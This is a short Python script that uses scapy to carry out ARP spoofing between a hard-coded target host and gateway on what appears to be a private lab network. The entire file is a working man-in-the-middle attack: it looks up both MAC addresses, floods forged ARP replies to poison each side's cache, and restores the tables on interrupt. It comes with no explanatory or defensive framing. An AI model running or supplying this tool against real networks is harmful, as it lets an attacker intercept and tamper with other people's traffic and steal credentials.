#!/usr/bin/env python3
import os
os.sys.path.append('/usr/bin/')
from scapy.all import *

gateway = "10.0.2.3"
target = "10.0.2.2"

def getMacAddr(target_ip):
    print("Getting MAC Address for", target_ip)
    arp_packet=Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=target_ip)
    target_mac = srp(arp_packet, timeout=2, inter = 0.1)[0][0][1].hwsrc
    print("MAC Address for", target_ip, ":", target_mac)
    return target_mac

def spoof_arp_cache(target_ip, target_mac, source_ip):
    spoofed = ARP(op=2, pdst=target_ip, psrc=source_ip, hwdst=target_mac)
    send(spoofed, verbose=False)
    
def restore_arp(target_ip, target_mac, source_ip, source_mac):
    packet = ARP(op=2, hwsrc=source_mac, psrc=source_ip, hwdst=target_mac, pdst=target_ip)
    send(packet, verbose=False)
    print("Arp Table restored for " + target_ip)

def main():
    target_ip = target
    gateway_ip = gateway
    
    try:
        target_mac = getMacAddr(target_ip)
    except:
        print("Target machine did not respond")
        quit()
    
    try:
        gateway_mac = getMacAddr(gateway_ip)
        print("Gateway Mac: " + gateway_mac)
    except:
        print("Gateway is unreachable")
        quit()
    
    try:
        print("Sending spoofed ARP responses...(Ctrl+C to Stop)")
        while True:
            spoof_arp_cache(target_ip, target_mac, gateway_ip)
            spoof_arp_cache(gateway_ip, gateway_mac, target_ip)
            
    except KeyboardInterrupt:
        print("\nArp Spoof Stopped")
        restore_arp(gateway_ip, gateway_mac, target_ip, target_mac)
        restore_arp(target_ip, target_mac, gateway_ip, gateway_mac)
        quit()
            

if __name__ =="__main__":
    main()